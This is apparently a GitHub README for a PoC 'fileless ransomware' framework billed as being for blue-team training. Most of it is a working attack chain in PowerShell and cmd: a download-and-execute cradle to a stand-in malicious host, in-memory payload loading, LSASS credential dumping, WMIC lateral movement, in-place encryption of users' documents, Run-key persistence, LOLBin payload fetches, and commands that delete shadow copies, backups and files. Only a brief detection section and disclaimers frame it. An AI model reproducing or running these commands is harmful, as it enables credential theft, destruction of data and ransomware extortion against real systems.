
# ⚠️ NSFW-Ransomware: Fileless Ransomware Simulation & Detection Framework (PoC)

> **⚠️ For Educational & Authorized Research Use Only**  
> This project is intended exclusively for **detection engineering**, **blue team training**, and **offensive security research** within **isolated lab environments**.  
> **Do not deploy in production environments or on unauthorized systems.**  
> The authors assume **no liability** for misuse or unintended consequences.

---

![NSFW-Ransomware Simulation](https://github.com/user-attachments/assets/0a7b0119-2b11-49f1-93af-4fae2e6517bc)

---

## Table of Contents

- [Overview](#overview)
- [Features](#features)
- [Attack Chain Overview](#attack-chain-overview)
- [Getting Started](#getting-started)
- [Attack Simulation (PowerShell)](#attack-simulation-powershell)
- [Reconnaissance & LOLBins](#reconnaissance--lolbins)
- [Advanced Tradecraft](#advanced-tradecraft)
- [ATT&CK Framework Mapping](#attack-framework-mapping)
- [Destructive Payload Scenarios](#destructive-payload-scenarios)
- [Detection & Mitigation](#detection--mitigation)
- [Legal Notice](#legal-notice)
- [References](#references)

---

## Overview

**NSFW-Ransomware** is a simulated fileless ransomware framework designed to emulate advanced adversarial behaviors using Windows-native binaries (LOLBins), reflective DLL injection, and in-memory payload delivery. This tool enables defenders to safely test and improve detection strategies within controlled environments.

### Primary Objectives

- Emulate realistic fileless ransomware operations.
- Provide modular components for red/purple teaming exercises.
- Demonstrate misuse of trusted binaries to bypass traditional defenses.

---

## Features

- **Fileless Execution** – Payloads remain entirely in memory.
- **LOLBins Abuse** – Executes using native Windows binaries (e.g., `rundll32`, `certutil`, `regsvr32`).
- **Privilege Escalation** – Demonstrates techniques like Print Spooler and HiveNightmare.
- **Lateral Movement** – Mimics propagation through SMB/WinRM.
- **Simulated Impact** – File encryption, recovery prevention, system sabotage.
- **Modular Design** – Adaptable for C2 emulation, detection tuning, or security training.
- **MITRE ATT&CK Mappings** – Fully aligned with industry-standard TTPs.

---

## Attack Chain Overview

1. **Initial Access** – Payload delivery via trusted binaries.
2. **Privilege Escalation** – Local exploitation (e.g., Print Spooler abuse).
3. **Credential Dumping** – LSASS memory scraping via `rundll32`.
4. **Lateral Movement** – Executed through remote scripting and network shares.
5. **Impact** – Simulated encryption and destruction of user files.
6. **Persistence** – Achieved using registry-based PowerShell autorun entries.

---

## Getting Started

### Prerequisites

- Windows 10/11 VM with snapshots enabled
- PowerShell v5+
- Administrator privileges
- (Optional) Internet access for payload retrieval
- Tools: [7-Zip](https://www.7-zip.org/), Sysinternals Suite, [Sigma](https://github.com/SigmaHQ/sigma)

### Execution Guidelines

- No compilation required — the framework uses native PowerShell and system binaries.
- All examples below should be executed **in a sandboxed or test VM only**.

---

## Attack Simulation (PowerShell)

```powershell
# Step 1: Initial access via fileless dropper
IEX(New-Object Net.WebClient).DownloadString("http://malicious.local/dropper.ps1")

# Step 2: In-memory .NET payload loading
$bytes = [System.Convert]::FromBase64String("[BASE64_PAYLOAD]")
[System.Reflection.Assembly]::Load($bytes)

# Step 3: Privilege escalation
Start-Process powershell -Args "-File C:\Temp\elevate.ps1" -Verb RunAs

# Step 4: Credential dumping
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\Temp\lsass.dmp full

# Step 5: Lateral movement
wmic /node:TARGET_PC process call create "powershell.exe -File \\network_share\payload.ps1"

# Step 6: Simulated file encryption
$files = Get-ChildItem "C:\Users\*\Documents" -Include *.docx,*.pdf -Recurse
foreach ($file in $files) {
  $data = Get-Content $file.FullName -Raw
  $aes = New-Object System.Security.Cryptography.AesManaged
  $aes.Key = [Text.Encoding]::UTF8.GetBytes("RANDOM-GEN-KEY-1234567890123456")
  $aes.IV = New-Object byte[] 16
  $enc = $aes.CreateEncryptor().TransformFinalBlock([Text.Encoding]::UTF8.GetBytes($data), 0, $data.Length)
  Set-Content -Path $file.FullName -Value ([Convert]::ToBase64String($enc))
}

# Step 7: Persistence (registry-based PowerShell autorun)
Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "ransomware" -Value "powershell -File C:\Temp\persist.ps1"
````

---

## Reconnaissance & LOLBins

### Google Dorking Examples

```text
inurl:"/hp/device/this.LCDispatcher"
intitle:"Web Image Monitor"
inurl:"/printers/"
intitle:"Konica Minolta"
inurl:"/printer/main.html"
intitle:"PaperCut MF"
```

### Living Off the Land Binaries (LOLBins)

```cmd
rundll32.exe \\192.168.X.X\share\payload.dll,ReflectEntry
regsvr32.exe /s /n /u /i:http://malicious.local/script.sct scrobj.dll
certutil.exe -urlcache -split -f http://malicious.local/dropper.b64 drop.b64
```

---

## Advanced Tradecraft

### Steganographic File Dropper

```cmd
copy /b clean.jpg + encrypted.7z clean.jpg
certutil -decode clean.jpg payload.7z
7z x payload.7z -oC:\Temp
```

### Reflective DLL Injection

```cmd
rundll32.exe \\attacker\payload.dll,ReflectEntry
```

> *Note: This technique is commonly used to bypass disk forensics and traditional AV signatures.*

---

## MITRE ATT\&CK Framework Mapping

| Phase                | Technique                            | ID               | Description                               |
| -------------------- | ------------------------------------ | ---------------- | ----------------------------------------- |
| Initial Access       | Valid Accounts, Drive-by Compromise  | T1078, T1189     | Initial foothold via trusted interfaces   |
| Execution            | LOLBins, Reflective Injection        | T1218, T1055.001 | Stealthy memory-only execution            |
| Privilege Escalation | Print Spooler Exploit, HiveNightmare | T1068, T1003.002 | SYSTEM-level privilege escalation         |
| Defense Evasion      | Encoded Commands, Fileless Execution | T1027, T1202     | Evasion via obfuscation and in-memory ops |
| Credential Access    | LSASS Dumping                        | T1003            | Dumping credentials via memory access     |
| Lateral Movement     | SMB, Remote Scripting                | T1021.002        | Movement across systems using LOLBins     |
| Impact               | Encryption, Destructive Commands     | T1485, T1486     | File encryption and system sabotage       |

---

## Destructive Payload Scenarios (LOLBins)

```cmd
cipher /w:C:                                       # Secure delete free space
vssadmin delete shadows /all /quiet               # Shadow copy deletion
wbadmin delete systemstatebackup -keepVersions:0  # Backup removal
bcdedit /set {default} recoveryenabled No         # Disable recovery boot
fsutil dirty set C:                               # Force dirty bit
forfiles /p C:\ /s /d -2 /c "cmd /c del /q @file" # Mass deletion
schtasks /create /tn "Wipe" /tr "cmd /c del /f /q C:\*.xls" /sc once /st 23:59
```

---

## Detection & Mitigation

### Detection Strategies

* **Sysmon + Sigma**:

  * Monitor for unusual LOLBin activity
  * Detect fileless persistence via registry keys
  * Identify PowerShell encoding and obfuscation

* **SIEM (Splunk, ELK)**:

  * Correlate process trees and anomalies
  * Alert on remote execution from network shares

* **EDR/XDR Tools**:

  * Detect reflective DLL injection
  * Flag in-memory-only payloads

### Mitigation Tactics

```powershell
# Disable vulnerable services
Stop-Service Spooler -Force
Set-Service Spooler -StartupType Disabled

# Harden LOLBin usage (via WDAC, AppLocker)
# Apply latest patches (PrintNightmare, HiveNightmare)

# Restrict network shares and SMB access
# Isolate high-value assets via segmentation

# Maintain frequent, secure, offline backups
```

---

## Legal Notice

> This framework is provided **solely for lawful, academic, and professional research**.
> Unauthorized distribution, execution on live systems, or malicious use is **strictly prohibited**.
> **The authors disclaim all liability** for any damage or legal consequences arising from misuse.

---

## References

* [LOLOL.farm – LOLBin Playground](https://lolol.farm/)
* [PrintNightmare Post-Mortem](https://itm4n.github.io/printnightmare-not-over/)
* [HiveNightmare Exploit](https://github.com/GossiTheDog/HiveNightmare)
* [Sigma Detection Rules](https://github.com/SigmaHQ/sigma)
* [Crow Security – DLL Injection Primer](https://www.crow.rip/crows-nest/mal/dev/inject/dll-injection)
* [Wikipedia – Fileless Malware](https://en.wikipedia.org/wiki/Fileless_malware)
* [MITRE ATT\&CK T1055.001](https://attack.mitre.org/techniques/T1055/001/)




